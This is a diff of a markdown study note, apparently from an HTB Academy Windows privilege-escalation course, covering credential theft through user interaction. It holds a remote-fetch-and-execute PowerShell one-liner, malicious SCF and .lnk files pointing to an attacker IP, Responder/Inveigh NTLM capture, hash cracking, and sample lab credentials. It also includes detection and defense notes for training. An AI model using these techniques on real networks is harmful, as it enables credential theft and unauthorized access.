@@ -1,4 +1,4 @@
-# Interacting with Users
+# 👥 Interacting with Users
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 📡 Traffic Capture Techniques
 
 ### Wireshark Privilege Exploitation
+
 ```cmd
 # Wireshark vulnerability:
 - Npcap driver access NOT restricted to Administrators by default
@@ -19,6 +20,7 @@
 ```
 
 ### Network Traffic Monitoring
+
 ```bash
 # On attack machine - passive traffic capture:
 tcpdump -i <interface> -w capture.pcap
@@ -31,6 +33,7 @@ net-creds -p capture.pcap          # PCAP file analysis
 ```
 
 ### Example Credential Capture
+
 ```cmd
 # Wireshark FTP capture example:
 Source: 10.129.43.8 → Destination: 10.129.43.7
@@ -46,6 +49,7 @@ PASS FTP_adm1n!
 ## 🔍 Process Command Line Monitoring
 
 ### PowerShell Process Monitor
+
 ```powershell
 # Monitor for credentials in command lines:
 while($true)
@@ -58,6 +62,7 @@ while($true)
 ```
 
 ### Remote Script Execution
+
 ```powershell
 # Host script on attack machine and execute remotely:
 IEX (iwr 'http://10.10.10.205/procmon.ps1')
@@ -69,6 +74,7 @@ net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd
 ```
 
 ### Target Processes
+
 ```cmd
 # Look for processes containing:
 - net use commands with /user: parameter
@@ -81,6 +87,7 @@ net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd
 ## 🗂️ Vulnerable Services Exploitation
 
 ### Docker Desktop CVE-2019-15752
+
 ```cmd
 # Vulnerability details:
 - Affects Docker Desktop Community Edition before 2.1.0.1
@@ -96,6 +103,7 @@ net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd
 ```
 
 ### Service Enumeration Strategy
+
 ```cmd
 # Look for vulnerable service versions:
 - Docker Desktop < 2.1.0.1
@@ -107,6 +115,7 @@ net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd
 ## 📁 SCF File Hash Capture
 
 ### Shell Command File (SCF) Attack
+
 ```cmd
 # SCF file purpose:
 - Used by Windows Explorer for navigation
@@ -115,6 +124,7 @@ net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd
 ```
 
 ### Malicious SCF Creation
+
 ```ini
 # Create @Inventory.scf (@ for top of directory listing):
 [Shell]
@@ -130,6 +140,7 @@ Command=ToggleDesktop
 ```
 
 ### Responder Hash Capture
+
 ```bash
 # Start Responder for NTLM capture:
 sudo responder -wrf -v -I tun0
@@ -143,6 +154,7 @@ sudo responder -wrf -v -I tun0
 ```
 
 ### Hash Cracking
+
 ```bash
 # Crack NTLMv2 hash with Hashcat:
 hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
@@ -156,6 +168,7 @@ ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:...:Welcome1
 ## 🔗 Malicious .lnk File Attacks
 
 ### .lnk vs SCF Compatibility
+
 ```cmd
 # SCF limitations:
 - No longer works on Server 2019
@@ -168,6 +181,7 @@ ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:...:Welcome1
 ```
 
 ### PowerShell .lnk Generation
+
 ```powershell
 # Create malicious .lnk file:
 $objShell = New-Object -ComObject WScript.Shell
@@ -181,6 +195,7 @@ $lnk.Save()
 ```
 
 ### .lnk File Properties
+
 ```cmd
 # Key properties for stealth:
 TargetPath:     \\<attacker_ip>\@<fake_file>
@@ -198,6 +213,7 @@ HotKey:         Optional keyboard shortcut
 ## 🎯 File Share Attack Strategy
 
 ### Target Selection
+
 ```cmd
 # High-value file share targets:
 - Network drives (mapped drives)
@@ -209,6 +225,7 @@ HotKey:         Optional keyboard shortcut
 ```
 
 ### File Placement Strategy
+
 ```cmd
 # Optimal placement:
 1. Recently accessed directories
@@ -219,6 +236,7 @@ HotKey:         Optional keyboard shortcut
 ```
 
 ### Naming Conventions
+
 ```cmd
 # Effective file names:
 @Inventory.scf          # @ for top listing
@@ -231,6 +249,7 @@ HotKey:         Optional keyboard shortcut
 ## 🔧 Alternative Hash Capture Tools
 
 ### Responder Alternatives
+
 ```bash
 # Inveigh (PowerShell-based):
 Import-Module Inveigh.ps1
@@ -243,6 +262,7 @@ Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBT Y -mDNS Y
 ```
 
 ### Tool Comparison
+
 ```cmd
 # Responder:    # Python-based, Linux preferred
 # Inveigh:      # PowerShell, Windows native
@@ -252,12 +272,14 @@ Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBT Y -mDNS Y
 ## 🎯 HTB Academy Lab Solution
 
 ### Lab Environment
+
 ```cmd
 # Access: RDP to target with htb-student:HTB_@cademy_stdnt!
 # Objective: Obtain cleartext credentials for SCCM_SVC user
 ```
 
-### SCCM_SVC Credential Extraction
+### SCCM\_SVC Credential Extraction
+
 ```cmd
 # Method 1: Process monitoring for scheduled tasks
 # SCCM often runs scheduled tasks with service accounts
@@ -273,6 +295,7 @@ Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBT Y -mDNS Y
 ```
 
 ### Practical Approach
+
 ```powershell
 # 1. Start process monitoring:
 while($true) {
@@ -294,6 +317,7 @@ sudo responder -wrf -v -I tun0
 ## 🔄 Advanced User Interaction Techniques
 
 ### Multi-Vector Approach
+
 ```cmd
 # Comprehensive strategy:
 1. Network traffic monitoring (passive)
@@ -304,6 +328,7 @@ sudo responder -wrf -v -I tun0
 ```
 
 ### Persistence Considerations
+
 ```cmd
 # Long-term assessment tactics:
 - Plant multiple malicious files across shares
@@ -316,6 +341,7 @@ sudo responder -wrf -v -I tun0
 ## ⚠️ Detection & Defense
 
 ### Detection Indicators
+
 ```cmd
 # Monitor for:
 - Unusual .scf/.lnk file creation in shares
@@ -327,6 +353,7 @@ sudo responder -wrf -v -I tun0
 ```
 
 ### Defensive Measures
+
 ```cmd
 # Security recommendations:
 - Restrict Npcap driver to Administrators only
@@ -350,6 +377,6 @@ sudo responder -wrf -v -I tun0
 7. **Hash capture + offline cracking** provides reliable credential theft
 8. **Multiple attack vectors** increase success probability
 
----
+***
 
-*User interaction attacks exploit human behavior and system trust relationships to capture credentials when technical privilege escalation methods are insufficient.* 
+_User interaction attacks exploit human behavior and system trust relationships to capture credentials when technical privilege escalation methods are insufficient._
